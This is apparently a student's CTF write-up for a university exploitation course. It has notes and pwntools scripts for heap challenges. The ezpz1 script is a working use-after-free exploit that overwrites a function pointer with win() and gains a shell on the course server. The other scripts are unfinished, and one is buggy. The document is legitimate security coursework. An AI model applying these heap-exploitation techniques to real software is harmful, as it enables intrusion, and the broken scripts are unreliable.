z5214048
War 7
=====================

(war? War never changes)

ezpz1 
==================

Flag: COMP6447{heap_is_not_really_trivial}

General overview of problems faced
-------------------------------------
Had to hack the program

. I tried to do the following:
1. Populate program with 20 random questions
2. Lets say the "target" is q4. input shellcode (or  actually any string) into it -> so far so good
3.1 Delete q4, ask q4 -> crash. Though GDB says that the program jumps into q4 question string and crashes to matter what are the next commands (non executable area? I guess I should have expected that)
3.2 Delete q4, create a new question ->  crash
3.3 Delete q4 *twice*, create new question, ask it -> empty

4. following through in gdb, step by step, to why it crashes
5. Yo discovered something! The program's dumb, so the question's inner struct depends on the prev Qn. Overwrite fd address like ez!

Script/Command used
------------------

```
#python2

import string
import json

from pwn import *

NAME = "./ezpz1"
context.binary = NAME

def io_beg(): 
	return remote("plzpwn.me", 7001)
	#return process(NAME)

def header(s, len=20):
	print("="*len +s+"="*len)


def io_rdy(io):
	io.recvuntil("[Q]uit")
	print("Ready")

def io_q(io):
	io.sendline("q")
	
def io_c(io):
	io.sendline("c")
	io.recvuntil("Created new question. ID")
	buf = io.recvline().strip()
	io_rdy(io)
	return int(buf)
	
def io_d(io, id):
	io.sendline("d")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io_rdy(io)

def io_s(io, id, s):
	print("filling "+str(id)+" with "+s)
	io.sendline("S")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io.recv(timeout=1)
	io.sendline(s)
	return 0

def io_a(io, id):
	io.sendline("a")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	
	io.recvuntil("I have the answer perhaps: '")
	buf = io.recvuntil("'")
	io_rdy(io)
	return buf

# inclusive
def io_all(io, min, max):
	buf = {}
	for i in range(max-min+1):
		k = i+min
		current = {str(k).zfill(3): io_a(io, k)}
		
		buf.update(current)
	
	j = json.dumps(buf, indent = 2, sort_keys=True)
	return j


maxlen = 23 #fgets, 24-\n = 23

# win	08048A5C	
win = 0x08048A5C
fin = 0
k = 0

io = io_beg()
io_rdy(io)

header("M1")
io_c(io)
io_s(io, 0, "B"*maxlen)
io_d(io, 0)

header("M2")
buf = io_c(io)
assert(buf == 1)

payload = p32(win)

io_s(io, 1, payload)
io.sendline("a")
io.recvuntil("Enter question id: ")
io.sendline(str(id))
io.interactive()
```

```
Enter
Enter
cat flag
```

ezpz2
===========================

Flag: (got it almost :( )

General overview of problems faced
-------------------------------------
Had to hack the program:
* Unlike in ezpz1, the question text is overwtitable like so!
* Not the prev attack - doesn't work out
1. Populate program with 20 random questions
2. Figure out that if questions created (malloc'd) one after another, the length in between q. N and q. N+1 is always the same: 50 DEC
3. Fill in ''target'' with 50+6 bytes of rubbish, followed by p32 of win()
3.1 Oh crap - no win
3.2 Try ROP stuff:
3.2.1 Find some useful gadgets - ok
3.2.2 no "int 0x80" - oh man
3.2.3 Needa do "rop2libc", but sadly didn't figure out exactly how. Will have a session with Adamt on it tomorrow. Pretty sure rop2libc would've solved the issue ez



Script/Command used
------------------
```
#python2

import string
import json

from pwn import *

NAME = "./ezpz2"
context.binary = NAME

# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""

def io_beg(): return process(NAME)

def header(s, len=20):
	print("="*len +s+"="*len)


def io_rdy(io):
	io.recvuntil("[Q]uit")
	#print("Ready")

def io_q(io):
	io.sendline("q")
	
def io_c(io):
	io.sendline("c")
	io.recvuntil("Created new question. ID")
	buf = io.recvline().strip()
	io_rdy(io)
	return int(buf)
	
def io_d(io, id):
	io.sendline("d")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io_rdy(io)

def io_s(io, id, s):
	#print("filling "+str(id)+" with "+s)
	io.sendline("S")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io.recv(timeout=1)
	io.sendline(s)
	return 0

def io_a(io, id):
	io.sendline("a")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io.recvuntil("I have the answer perhaps: '")
	buf = io.recvuntil("'")
	io_rdy(io)
	return buf

# inclusive
def io_all(io, min, max):
	buf = {}
	for i in range(max-min+1):
		k = i+min
		current = {str(k).zfill(3): io_a(io, k)}
		
		buf.update(current)
	
	j = json.dumps(buf, indent = 2, sort_keys=True)
	return j

def io_fill(io, n):
	#header("Fill 1")
	for i in range(n):
		io_c(io)
	
	
	#header("Fill 2")
	maxlen = 23 #fgets, 24 - 1
	c = cyclic(length=None, alphabet="0123456789BEF")
	for i in range(n):
		io_s(io, i, c[maxlen*i:(maxlen*(i+1))])
		
	#header("Fill 3")
	buf = io_all(io, 0, n-1)
	
	#header("Fill fin")
	#print(buf)

def io_isCrash(io):
	buf = io.poll(False)
	
	if(buf == None):
		io_q(io)
		return 0
	elif(buf != 0):
		return 1
	else:
		return 0
	
header("P0")

# main	08048B3D	
main = 0x08048B3D
#banner	0804B060	
banner = 0x0804B060

target = 4

fin = 0

io = io_beg()
io_rdy(io)
io_fill(io,20)

io_s(io,target, "\x90"*56 + str(p32(binsh)))

# 0x08048e53 : call dword ptr [eax]
rop_call_at_eax = p32(0x08048e53)

"""
0x080485e0 : call eax
0x0804862d : call edx
0x08048b89 : cld ; ret
0x0804904f : inc ecx ; ret
"""


try:
	io_a(io,target+1)
except Exception, e:
	pass

io.interactive()
		
print("FIN")

"""
io_d(io, 10)
print(io_all(io, 0,9))
print(io_all(io, 11,19))
"""
```

# notezpz

General overview of problems faced
-------------------------------------
Couldn't figure out how exactly do I hack this? Populating with data + random creatins and deletes don't lead anywhere. General ideas I had:
* Try ezpz1 attack -> fail
* Try ezpz2 attack -> fail
* Try deleting questions and creating the ones, in hope it would lead anywhere -> no luck, although pretty interesting
* Somehow corrupt the heap slice headers to make them point somewhere else -> no luck

# usemedontabuseme

General overview of problems faced
-------------------------------------
* Done tons of recon, but I don't seem to get the idea on how, when and why does the heap get corrupted. Seemingly, the [H]int free and [B] free act slightly differently, perhaps this is the way? 
* Regardless, the general feel is this task is that I had to corrupt stack, create fake heap entries within len = 8 (3+1+4), and get one of the fake entries to point to win() func

Script/Command used
------------------

```
#python2

import string
import json

from pwn import *

NAME = "./usemedontabuseme"
context.binary = NAME

def io_beg():
	return process(NAME)

def io_rdy(io):
	io.recvuntil("| [Q] Exit       |")
	io.recvuntil("Choice:")
	print("Ready")

def header(s, len=20):
	return ("="*len +s+"="*len)
	
def io_a(io, id, s):
	io.sendline("a")
	
	io.recvuntil("Preparing to clone body...")
	io.recvuntil("Clone ID:")
	io.sendline(str(id))
	
	io.recvuntil("Enter Name (max length 8):")
	io.sendline(s)
	
	io_rdy(io)

def io_b(io, id):
	# RET vals
	#	-1	"Clone doesnt exist!"
	#	00	Bad ID
	#	01	Success

	io.sendline("b")
	
	# might be several lines, so let's say it's at least one line
	io.recvline()
	
	# ok back on track
	io.recvuntil("Clone ID:")
	io.sendline(str(id))

	# now lets see what the program says
	buf1 = io.recvline()
	buf2 = buf1.split(" ")
	buf3 = buf2[-1]
	
	if(unicode(buf3).isnumeric()):
		buf4 = int(buf3)
		if(id == buf4):
			r = 1
		else:
			r = 0
	else:
		r = -1
		
	io_rdy(io)
	return r
		

def io_c(io, id, s):
	# RET vals
	#	"Clone doesnt exist!"
	#	"blablabla"	program output
	
	io.sendline("c")
	
	# might be several lines, so let's say it's at least one line
	io.recvline()
	
	# ok back on track
	io.recvuntil("Clone ID:")
	io.sendline(str(id))

	# now lets see what the program says
	buf1 = io.recv(timeout=1)
	
	if(buf1.find("doesnt exist") != -1):
		r = buf1
	elif(buf1.find("Enter Name (max length 8):") != -1):
		io.sendline(s)
		r = io.recvline()
		
	io_rdy(io)
	return r

def io_d(io, id):
	io.sendline("d")
	
	# might be several lines, so let's say it's at least one line
	io.recvline()
	
	# ok back on track
	io.recvuntil("Clone ID:")
	
	sid = str(id)
	io.sendline(sid)

	buf = io.recvuntil("------------------")
	buf = buf.replace("------------------", "")
	buf2 = header(sid+" BEG") + "\n" + buf + header(sid+" FIN") + "\n"
	return buf2

def io_q(io):
	io.sendline("q")
	io.recvuntil("Goodbye!")
	return 1

def io_pill(io, min, max):
	buf = ""
	for i in range(max-min+1):
		k = i+min
		buf += io_d(io, k)
		
	return buf

def io_fill(io, min, max):
	# win	08048B7C	
	win = str(p32(0x08048B7C))
	
	c = cyclic(1024, alphabet="0123456789")
	
	for i in range(max-min+1):
		k = i+min
		buf = win*1000 #c[k*8 : (k+1)*8]
		io_a(io, i, buf)

io = io_beg()
io_fill(io, 0, 8)
print(io_pill(io, 0, 9))
print(header("Phrase 2"))
io_b(io, 5)
print(io_pill(io, 0, 9))


io.interactive()

```


